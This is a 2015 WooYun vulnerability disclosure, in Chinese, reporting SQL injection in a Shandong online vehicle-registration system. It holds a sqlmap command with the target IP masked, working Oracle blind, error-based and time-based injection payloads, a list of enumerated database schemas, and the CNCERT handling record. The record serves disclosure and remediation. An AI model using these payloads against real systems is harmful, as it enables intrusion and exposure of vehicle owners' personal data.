wybug_title: 山东车管所系统SQL注入可导致车主信息泄露
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-10-11：	细节已通知厂商并且等待厂商处理中									2015-10-16：	厂商已经确认，细节仅向厂商公开									2015-10-26：	细节向核心白帽子及相关领域专家公开									2015-11-05：	细节向普通白帽子公开									2015-11-15：	细节向实习白帽子公开									2015-11-30：	细节向公众公开  简要描述： 德州市网上车管所注册页面存在sql注入，很多城市采用相同的系统（山东国安信息产业有限责任公司开发），均存在漏洞 详细说明：  
"**.**.**.**:9080/wscgs/reguser.do" --data="yhdh=aabbcc&mm=aaaaaa&mm1=aaaaaa&xm=%CD%F5%B6%FE%C2%E9&sfzmhm=130131198009112312&sjhm=13867546778&email=&state=&type=insert" --dbms=oracle
   漏洞证明：  sqlmap resumed the following injection point(s) from stored session:---Parameter: yhdh (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: yhdh=aabbcc' AND 5931=5931 AND 'SnsF'='SnsF&mm=aaaaaa&mm1=aaaaaa&xm=%CD%F5%B6%FE%C2%E9&sfzmhm=130131198009112312&sjhm=13867546778&email=&state=&type=insert    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: yhdh=aabbcc' AND 8030=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(113)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (8030=8030) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(106)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND 'FDEG'='FDEG&mm=aaaaaa&mm1=aaaaaa&xm=%CD%F5%B6%FE%C2%E9&sfzmhm=130131198009112312&sjhm=13867546778&email=&state=&type=insert    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: yhdh=aabbcc' AND 1543=DBMS_PIPE.RECEIVE_MESSAGE(CHR(111)||CHR(100)||CHR(114)||CHR(84),5) AND 'Gvam'='Gvam&mm=aaaaaa&mm1=aaaaaa&xm=%CD%F5%B6%FE%C2%E9&sfzmhm=130131198009112312&sjhm=13867546778&email=&state=&type=insert---[20:52:28] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle---Parameter: yhdh (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: yhdh=aabbcc' AND 5931=5931 AND 'SnsF'='SnsF&mm=aaaaaa&mm1=aaaaaa&xm=%CD%F5%B6%FE%C2%E9&sfzmhm=130131198009112312&sjhm=13867546778&email=&state=&type=insert    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: yhdh=aabbcc' AND 8030=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(113)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (8030=8030) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(113)||CHR(106)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND 'FDEG'='FDEG&mm=aaaaaa&mm1=aaaaaa&xm=%CD%F5%B6%FE%C2%E9&sfzmhm=130131198009112312&sjhm=13867546778&email=&state=&type=insert    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: yhdh=aabbcc' AND 1543=DBMS_PIPE.RECEIVE_MESSAGE(CHR(111)||CHR(100)||CHR(114)||CHR(84),5) AND 'Gvam'='Gvam&mm=aaaaaa&mm1=aaaaaa&xm=%CD%F5%B6%FE%C2%E9&sfzmhm=130131198009112312&sjhm=13867546778&email=&state=&type=insert---web application technology: JSPback-end DBMS: Oracleavailable databases [28]:[*] APEX_030200[*] APPQOSSYS[*] CTXSYS[*] DBSNMP[*] EXFSYS[*] FLOWS_FILES[*] GXHPDZ_USER[*] HPGL_USER[*] HR[*] IX[*] MDSYS[*] OE[*] OLAPSYS[*] ORDDATA[*] ORDSYS[*] OUTLN[*] OWBSYS[*] PM[*] QSWEBCGS_USER[*] SCOTT[*] SH[*] SYS[*] SYSMAN[*] SYSTEM[*] VEH_ADMIN[*] WMSYS[*] WSCGS[*] XDB   修复方案：     版权声明：转载请注明来源 藏锋者@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-10-16 11:14 厂商回复： CNVD确认所述情况,已经转由CNCERT下发给山东分中心,由其后续协调网站管理单位处置 最新状态： 暂无
